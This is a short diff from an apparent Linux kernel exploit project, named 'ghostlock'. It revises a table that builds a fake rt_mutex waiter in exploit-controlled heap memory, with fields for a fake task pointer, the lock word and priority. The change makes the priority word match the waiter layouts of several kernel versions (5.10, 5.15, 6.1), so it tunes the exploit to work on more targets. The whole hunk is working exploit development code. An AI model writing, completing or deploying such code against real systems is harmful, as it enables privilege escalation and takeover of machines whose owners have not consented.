@@ -529,10 +529,17 @@ namespace ghostlock::route {
                 {7, 0, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, lock_word, "lock"},
-                /* waiter+0x40 is `int prio` on 5.10 (no wake_state field: that is
-                 * the 6.6 shape, where the packed {wake_state, prio} word applied).
-                 * The old packing left prio = 3 with 140 in the padding word. */
-                {10, static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO), "prio"},
+                /* waiter+0x40 is `int prio` on 5.10; 5.15/6.1 put `unsigned int
+                 * wake_state` there and prio at +0x44, packed upstream as
+                 * (prio << 32) | wake_state. Both families take this compact
+                 * branch, so the word comes from the family-gated helper -- the old
+                 * unconditional packing left prio = 3 on 5.10 and prio = 0 on
+                 * 5.15/6.1 (see waiter-layout-family-gating-plan.md). */
+                {10,
+                 kernel::waiter_prio_word(kernel::FAKE_WAITER_PRIO,
+                                          session::g_exploit_session.profile
+                                                  .compact_waiter_has_wake_state()),
+                 "prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
